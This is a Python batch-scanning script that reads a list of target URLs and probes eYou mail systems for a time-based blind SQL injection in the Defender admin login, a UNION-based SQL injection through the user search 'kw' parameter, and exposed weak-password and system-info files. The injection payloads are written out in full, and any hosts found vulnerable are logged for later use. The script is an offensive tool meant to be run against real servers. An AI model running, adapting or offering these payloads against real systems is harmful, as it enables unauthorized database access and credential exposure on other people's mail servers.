import requests,time,json

urls = open('url.txt')


for i in urls:

    url = i.rstrip("\n")
#Defender系统免登陆DBA注入
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = {
        "admin_id": "a' AND (SELECT * FROM (SELECT(SLEEP(6)))WAcW) AND 'oHiR'='oHiR",
        "admin_pass": "a"
    }
    vulnurl = url + r"/php/admin_login.php"
    start_time = time.time()
    try:
        req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
        if time.time() - start_time >= 6:
            print("[+]存在亿邮Defender系统SQL注入漏洞...(高危)\tpayload: " + vulnurl + "\npost: " + json.dumps(payload, indent=4),"red")
            with open('DBA注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在eyou_admin_id_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
#user 参数kw SQL注入
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/user/?q=help&type=search&page=1&kw=-1%22)UnIoN/**/AlL/**/SeLeCt/**/1,2,3,Md5(1234),5,6,7%23"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在亿邮mail5 user 参数kw SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('kw SQL注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在eyou_user_kw_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
#弱口令列表泄露

    payload = "/weakpass.list"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
        if req.status_code == 200 and r"@" in req.text:
            print("[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: " + vulnurl, "green")
            with open('弱口令列表泄露1.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在eyou_weakpass漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/sysinfo.html"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
        if req.status_code == 200 and r"系统基本信息检查" in req.text:
            print("[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: " + vulnurl, "green")
            with open('弱口令列表泄露2.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在eyou_weakpass漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
